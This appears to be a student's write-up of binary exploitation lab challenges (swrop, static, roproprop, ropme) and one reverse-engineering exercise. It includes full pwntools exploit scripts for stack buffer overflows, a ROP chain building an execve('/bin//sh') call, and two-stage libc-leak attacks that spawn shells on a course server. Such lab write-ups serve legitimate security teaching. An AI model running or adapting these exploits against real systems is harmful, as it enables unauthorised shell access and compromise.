swrop
===========================
Flag: FLAG{}
General overview of problems faced
-------------------------------------
Pretty straightforward, no problems here.

Script/Command used (Writeup)
------------------
`vulnerable_function` is vulnerable to a buffer overflow since `read()` is allowed to read in more data than the size of the provided buffer. So we set up a simple "stackframe" for a call to system(). Pad out the buffer with A's, put the address of the `system()` function in place of the return address. Then place our fake return address for after system() finishes (which we don't care about) and finally our argument for system(), the address of the /bin/sh string (which is inside the binary itself).

Exploit:
```
from pwn import *

PROG_NAME = "./swrop"
REMOTE_IP = "plsdonthaq.me"
REMOTE_PORT = 6001

if args.REMOTE:
    p = remote(REMOTE_IP, REMOTE_PORT)
    elf = ELF(PROG_NAME)
else:
    p = process(PROG_NAME, env={"LD_LIBRARY_PATH": "./libc-2.23.so"})
    elf = p.elf

payload = b'A'*0x88
// No PIE so this is easy
payload += p32(elf.plt['system'])
payload += b'A'*4
payload += p32(0x80485f0) # address of /bin/sh string

p.sendline(payload)

p.interactive()
```

static
===========================
Flag: FLAG{}
General overview of problems faced
-------------------------------------
In my opinion this was the hardest challenge this week, mainly because I found it difficult to get a hold of a "/bin/sh" string. After quite a bit of research I found that a good place to write data to would be .data (pretty obvious in hindsight but wasn't at the time). To make matters worse, after making a (relatively long) ROP chain, I still kept getting segfault errors. After further inspection I found this was caused by a "pop eax; ret" gadget I was using which had address 0x080a8cb6. The 2nd most significant byte of the address is 0x0a which is hex for the newline character which would cause `fgets()` to stop reading in data. This would be worked around by moving values between registers, but nonetheless was quite tricky.

Script/Command used (Writeup)
------------------
There's a buffer overflow vulnerability in `be_exploited`. However this is a static binary and all of the required libc functions are within this binary. Of course theres also no inclusion of a `system` function, but thats ok since we can always make an `execve` syscall. However there's also the issue that there's no /bin/sh string in the binary so we have to construct our own using gadgets. First we need a place where we can write data. Since there's no PIE we can just use a direct address to the .data segment  as shown by `readelf`:
```
  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
                    .
                    .
                    .
  [20] .data             PROGBITS        080da060 091060 000f20 00  WA  0   0 32
```

Using `ropper` I identified some potential gadgets to use:
```
0x0805b67e: pop ebx; pop edi; ret;
0x08056114: pop eax; pop edx; pop ebx; ret;
0x0806ef51: xor ecx, ecx; int 0x80;

0x0809ceb4: mov dword ptr [eax], edx; ret; 
0x08056c45: mov dword ptr [edx], eax; ret; 
0x08064564: mov eax, edx; ret; 
0x0806eb8b: pop edx; ret; 
0x080a8cb6: pop eax; ret;
```

However we can't actually use that last gadget "pop eax; ret;" since its address 0x080a8cb6 has 0x0a in the 2nd most significant bit which is hex for the newline character which will cause `fgets` to stop reading input. So we have to use a bunch of movs to shuffle registers around which isn't as convenient but still works. The format for writing to .data looks like this:
```
payload += p32(0x0806eb8b) #pop edx; ret; 
payload += p32("4 letters of a string") # data to write
payload += p32(0x08064564) #mov eax, edx; ret;
payload += p32(0x0806eb8b) #pop edx; ret;
payload += p32(0x080da060+offset) #.data address plus offset into the string
payload += p32(0x08056c45) #mov dword ptr [edx], eax; ret; 
```

It's probably all better understood looking at the annotated source code for the exploit though:
```
from pwn import *

PROG_NAME = "./static"
REMOTE_IP = "plsdonthaq.me"
REMOTE_PORT = 6002

if args.REMOTE:
    p = remote(REMOTE_IP, REMOTE_PORT)
    elf = ELF(PROG_NAME)
else:
    p = process(PROG_NAME)
    elf = p.elf

payload = b'A'*0x10

# move /bin to .data
payload += p32(0x0806eb8b) #pop edx; ret; 
payload += p32(0x6e69622f) # /bin
payload += p32(0x08064564) #mov eax, edx; ret;
payload += p32(0x0806eb8b) #pop edx; ret;
payload += p32(0x080da060) #.data
payload += p32(0x08056c45) #mov dword ptr [edx], eax; ret; 

# move //sh to .data+0x4
payload += p32(0x0806eb8b) #pop edx; ret; 
payload += p32(0x68732f2f) # //sh
payload += p32(0x08064564) #mov eax, edx; ret;
payload += p32(0x0806eb8b) #pop edx; ret;
payload += p32(0x080da064) #.data+0x4
payload += p32(0x08056c45) #mov dword ptr [edx], eax; ret; 

# move NULL to .data+0x8
payload += p32(0x0806eb8b) #pop edx; ret; 
payload += p32(0x00000000) #null
payload += p32(0x08064564) #mov eax, edx; ret;
payload += p32(0x0806eb8b) #pop edx; ret;
payload += p32(0x080da068) #.data+0x8
payload += p32(0x08056c45) #mov dword ptr [edx], eax; ret; 

# run execve(.data, NULL, NULL) --> .data contains out /bin//sh string
payload += p32(0x08056114) #pop eax; pop edx; pop ebx; ret;
payload += p32(0x0000000b) #syscall number 0xb
payload += p32(0x00000000) #null
payload += p32(0x080da060) #.data
payload += p32(0x0806ef51) #xor ecx, ecx; int 0x80;

p.sendline(payload)

p.interactive()
```

roproprop
===========================
Flag: FLAG{}

General overview of problems faced
-------------------------------------
In my opinion, this challenge was pretty easy (especially in comparison to static which confused me). Didn't have any issues here since we were given a leaked address already.

Script/Command used (Writeup)
------------------
We're given an address leak, so we take a look at what that is in the assembly:
```
call    setbuf
add     esp, 0x8
mov     eax, dword [ebx+0x1c]  {setbuf@GOT}
push    eax {var_c}
lea     eax, [ebx-0x1885]  {data_743, "- %p -\n"}
push    eax  {data_743, "- %p -\n"}
call    printf
```
As we can see the address being printed is the GOT entry for `setbuf`. However since `setbuf` is called before it, this means the GOT entry is updated to contain the actual libc address for `setbuf`. We can then subtract the libc offset of setbuf from this leak and get the libc base address.

From here it's just a matter overflowing the buffer in `joke` then overwriting the return address with the address of `system`. We also write a dummy return address for post-`system` execution and the address of a /bin/sh string used as the parameter for `system`.


Exploit:
```
from pwn import *

PROG_NAME = "./roproprop"
REMOTE_IP = "plsdonthaq.me"
REMOTE_PORT = 6003
REMOTE_LIBC = "./libc-2.23.so"
LOCAL_LIBC = "/lib32/libc.so.6"

if args.REMOTE:
    p = remote(REMOTE_IP, REMOTE_PORT)
    elf = ELF(PROG_NAME)
    libc = ELF(REMOTE_LIBC)
else:
    p = process(PROG_NAME)
    elf = p.elf
    libc = ELF(LOCAL_LIBC)

p.recvuntil("- ")
# the pointer we're given is a libc leak of setbuf
setbuf_leak = int(p.recvline()[:-3], 16)
p.recvline()

libc_base = setbuf_leak - libc.symbols['setbuf']
libc.address = libc_base
system_addr = libc.symbols['system']
binsh_addr = next(libc.search(b'/bin/sh'))

payload = b'A'*(0x4ca+0x4)
payload += p32(system_addr)
payload += b'BBBB' #return addr we don't care about
payload += p32(binsh_addr)

p.sendline(payload)

p.interactive()

```

ropme
===========================
Flag: FLAG{}
General overview of problems faced
-------------------------------------
I realised quickly that in order to leak the libc base address, I should be looking do execute something like `puts(*puts)` to get the dynamic address of the `puts` libc function, and then subtract the `puts` offset since I have the libc that was being used on the remote. However I got weird addresses that didn't start with `0xf7f?????`. After some time I realised that I was printing out the plt entry of `puts` rather than the `got` entry (which is update by the linker after the first call to puts).

Script/Command used (Writeup)
------------------
We're not given any leaked address here so we basically need 2 payload. One to leak the libc base and then another to actually pop a shell. We use the `puts(puts)` technique to print out the address of the `puts` function. Note that we need to print the GOT entry for `puts` not the PLT entry, else we won't get the dynamic libc address, but rather some internal address.
We use the same format exploit:
 - padding (to overflow buffer)
 - address of function to return to (in this case `puts`)
 - return address for after our function call is complete
 - arguments for the function we called (in this case the address of the `puts` GOT entry)

Usually we don't care what our return address for after the function call, is, because we would have had our shell already. However this time we do care because we need to execute a second payload. So we set this return address to `main` so that the code essentially starts from the beginning again.

With our libc leaked address, we subtract the offset for `puts` and successfully get the libc base.

Then when the `vuln` function runs again we can enter new input with a buffer overflow again. This time we just simply return to `system`, specifying a dummy return address and the address of the bin/sh string for the parameter.

Exploit:
```
from pwn import *

PROG_NAME = "./ropme"
REMOTE_IP = "plsdonthaq.me"
REMOTE_PORT = 6004
REMOTE_LIBC = "./libc-2.23.so"
LOCAL_LIBC = "/lib32/libc.so.6"
libc = ELF("./libc-2.23.so")

if args.REMOTE:
    p = remote(REMOTE_IP, REMOTE_PORT)
    elf = ELF(PROG_NAME)
    libc = ELF(REMOTE_LIBC)
else:
    p = process(PROG_NAME)
    elf = p.elf
    libc = ELF(LOCAL_LIBC)

p.recvlines(2)

payload = b'A'*(0x8+0x4)
payload += p32(elf.plt['puts'])
payload += p32(elf.symbols['main'])
payload += p32(elf.got['puts'])

p.sendline(payload)

leak = u32(p.recvline().rstrip()[:4])
libc_base = leak - libc.symbols['puts']
libc.address = libc_base
system_addr = libc.symbols['system']
binsh_addr = next(libc.search(b'/bin/sh'))

p.recvlines(2)

payload = b'A'*(0x8+0x4)
payload += p32(system_addr)
payload += p32(0xdeadbeef)
payload += p32(binsh_addr)

p.sendline(payload)

p.interactive()
```

re (reverse engineering challenge)
===========================

General overview of problems faced
-------------------------------------
For me, the hardest part was working out the types of the elements of the struct. Initially I had presumed the "val" would be an integer and then `mov [eax], dl` would be implemented using an & mask with 0xFF but this looked pretty messy.
I then remembered about struct packing and figured that since 1 byte is moved, the val element was most likely an unsigned char but the struct was still size 8 due to padding.

Reversed C Code
------------------

```
#include <stdlib.h>
#include <stdint.h>

// most likely a linked list implementation of sorts
struct myStruct {
    uint8_t val; // + 3 bytes of struct padding
    struct myStruct *next;
};

struct myStruct *unwind() {
    struct myStruct *s;
    struct myStruct *ret = NULL;
    int i = 0;

    while (i < 10) {
        s = (struct myStruct *) malloc(8);
        if (s == NULL) {
            exit(1);
        }
        if (ret == NULL) {
            ret = s;
        } else {
            s->next = ret;
            ret = s;
        }
        s->next = NULL; //probs bug in code but oh well (should be ret->b??)
        
        // if s->val was 4 byte int, this would be (i+'A') & 0xFF
        s->val = i+'A';
        i++;
    }

    return ret;
}
```